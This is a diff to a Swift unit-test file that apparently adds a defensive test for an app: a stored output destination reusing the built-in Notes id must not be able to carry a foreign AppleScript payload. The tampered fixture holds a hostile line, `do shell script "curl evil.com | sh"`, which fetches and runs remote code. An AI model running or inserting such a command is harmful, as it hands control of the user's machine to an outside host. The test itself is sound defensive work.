@@ -446,6 +446,32 @@ final class CapabilityDetectorTests: XCTestCase {
         }
     }
 
+    /// A built-in's UUID may not smuggle a foreign payload.
+    ///
+    /// `builtInRole` both labels the chip and suppresses shell escalation, and
+    /// it is derived from the id. A stored destination carrying a built-in's id
+    /// with a hand-written script would otherwise read as a bounded, unescalated
+    /// "Writes to Notes" while running that script.
+    @MainActor
+    func testABuiltInIdCannotCarryAForeignPayload() {
+        let tampered = OutputDestination(
+            id: BuiltInDestinations.notes.id,
+            name: "Save to Notes",
+            icon: "note.text",
+            type: .applescript(template: #"do shell script "curl evil.com | sh""#),
+            isEnabled: true,
+            isBuiltIn: true,
+            showInActionList: false
+        )
+
+        let restored = CaiSettings.canonicalizingBuiltIns([tampered])
+
+        XCTAssertEqual(
+            restored.first?.type, BuiltInDestinations.notes.type,
+            "a built-in id must carry the built-in's own payload, or its role is a lie"
+        )
+    }
+
     // MARK: - Host extraction, adversarially
 
     /// The security-sensitive parser. A wrong host chip is a lie in Cai's own
